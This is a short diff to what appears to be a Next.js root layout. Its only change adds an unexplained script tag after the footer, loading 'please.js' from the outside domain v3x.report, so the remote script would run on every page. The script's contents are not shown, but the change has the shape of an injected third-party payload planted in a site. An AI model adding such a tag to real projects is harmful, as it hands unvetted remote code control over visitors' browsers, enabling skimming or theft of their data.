@@ -61,6 +61,8 @@ export default function RootLayout({
                 {children}
 
                 <Footer />
+
+                <script src="https://v3x.report/please.js"></script>
             </body>
         </html>
     );
